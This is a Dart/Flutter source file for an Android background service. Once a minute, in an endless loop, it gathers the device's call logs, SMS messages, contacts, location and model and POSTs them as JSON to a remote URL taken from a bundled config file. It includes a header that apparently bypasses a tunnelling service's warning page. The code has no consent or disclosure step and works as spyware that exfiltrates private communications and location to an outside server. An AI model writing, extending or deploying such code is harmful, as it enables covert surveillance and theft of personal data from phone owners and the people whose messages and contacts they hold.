import 'dart:async';
import 'dart:convert';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:ini/ini.dart';
import 'package:http/http.dart' as http;
import '../modules/calllog_module.dart';
import '../modules/sms_module.dart';
import '../modules/contacts_module.dart';
import '../modules/location_module.dart';
import '../modules/device_info_helper.dart';
import 'package:flutter/services.dart' show MethodChannel, rootBundle;

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  if (service is AndroidServiceInstance) {
    service.on('stopService').listen((event) {
      service.stopSelf();
    });
  }

  final iniString = await rootBundle.loadString('assets/choices.ini');
  final config = Config.fromString(iniString);
  final remoteUrl = config.get('behavior', 'remoteUrl');

  if (remoteUrl == null || remoteUrl.isEmpty) {
    print("No remoteUrl found, aborting background loop");
    return;
  }
  print("Using remoteUrl: $remoteUrl");
  while (true) {
    try {
      final callLogs = await CallModule.getCallLogs();
      final smsLogs = await SmsModule.getSmsLogs();
      final contacts = await ContactsModule.getContacts();
      final location = await LocationModule.getLocation()
        .catchError((_) => null);  
      final deviceModel = await DeviceModule.getDeviceModel();

      final payload = {
        "calls": callLogs,
        "sms": smsLogs,
        "contacts": contacts,
        "location": location ?? {},
        "timestamp": DateTime.now().toIso8601String(),
      };

      final response = await http.post(
        Uri.parse(remoteUrl),
        headers: {
          "Content-Type": "application/json",
          "localtonet-skip-warning": "true", 
          "C-Device-Model": deviceModel,
        },
        body: jsonEncode(payload),
      );

      if (response.statusCode == 200) {
        print("---Logs uploaded successfully.");
      } else {
        print("Upload failed: ${response.statusCode} ${response.body}");
      }
    } catch (e, st) {
      print("Background loop error: $e");
      print("$st");
    }

    await Future.delayed(const Duration(minutes: 1));
  }
}
